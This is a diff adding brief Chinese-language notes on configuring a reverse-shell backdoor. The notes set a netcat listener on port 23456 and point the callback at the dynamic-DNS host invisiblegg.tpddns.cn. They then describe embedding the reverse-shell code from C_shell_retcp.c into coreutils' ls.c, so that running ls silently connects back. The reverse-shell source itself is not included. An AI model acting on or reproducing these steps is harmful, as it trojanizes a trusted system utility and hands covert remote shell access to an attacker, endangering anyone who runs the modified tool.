@@ -1,0 +1,4 @@
+1.端口改成23456  本地监测nc -l -p 23456
+2.ddns换成invisiblegg.tpddns.cn
+3.其中C_shell_retcp.c中的代码只需把主函数变成随意的普通函数，再在coreutils中ls.c源码中的主函数后边调用此函数，直接反弹。
+
